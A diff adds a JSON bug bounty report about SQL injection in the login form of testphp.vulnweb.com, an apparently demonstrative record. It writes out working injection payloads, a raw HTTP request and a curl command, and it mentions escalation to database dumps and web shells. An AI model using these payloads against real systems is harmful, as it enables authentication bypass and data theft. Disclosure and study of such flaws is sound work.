@@ -1,0 +1,14 @@
+{
+  "id": 800004,
+  "title": "SQL Injection in Login Form via uname Parameter on testphp.vulnweb.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "visibility": "full",
+  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
+  "reporter": {"username": "resurface_demo"},
+  "weakness": {"id": 67, "name": "SQL Injection"},
+  "vulnerability_information": "## Summary\nThe login functionality at `http://testphp.vulnweb.com/userinfo.php` is vulnerable to SQL Injection via the `uname` parameter. The application constructs SQL queries by directly concatenating user input without parameterized queries, allowing an attacker to bypass authentication and access any user's account and sensitive data including credit card numbers.\n\n## Steps to Reproduce\n1. Navigate to `http://testphp.vulnweb.com/login.php`\n2. In the username field, enter: `admin' OR '1'='1`\n3. In the password field, enter: `admin' OR '1'='1`\n4. Click \"login\"\n5. Observe that you are now logged in and redirected to the user profile page showing sensitive information including credit card number `1234-5678-2300-9000`, email `email@email.com`, and phone `2323345`.\n\n## Proof of Concept\n```http\nPOST /userinfo.php HTTP/1.1\nHost: testphp.vulnweb.com\nContent-Type: application/x-www-form-urlencoded\n\nuname=admin'+OR+'1'%3D'1&pass=admin'+OR+'1'%3D'1\n```\n\nThe response includes the user profile with sensitive data:\n```html\n<input type=\"text\" value=\"1234-5678-2300-9000\" name=\"ucc\" style=\"width:200px\">\n<input type=\"text\" value=\"email@email.com\" name=\"uemail\" style=\"width:200px\">\n<input type=\"text\" value=\"2323345\" name=\"uphone\" style=\"width:200px\">\n```\n\nError-based confirmation:\n```bash\ncurl -X POST 'http://testphp.vulnweb.com/userinfo.php' -d \"uname=admin'--&pass=test\"\n```\nReturns: `Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test'' at line 1`\n\nThis confirms the parameter is directly interpolated into the SQL query.\n\n## Impact\n- **Authentication bypass** — attacker can log in as any user without knowing the password\n- **Data exfiltration** — credit card numbers, emails, phone numbers of all users are exposed\n- **Full database access** — the SQLi can be escalated to extract all database tables via UNION-based or blind techniques\n- **Potential RCE** — MySQL's `INTO OUTFILE` could write web shells if file permissions allow",
+  "disclosed_at": "2025-07-05T14:00:00.000Z",
+  "bounty_amount": "5000.0"
+}
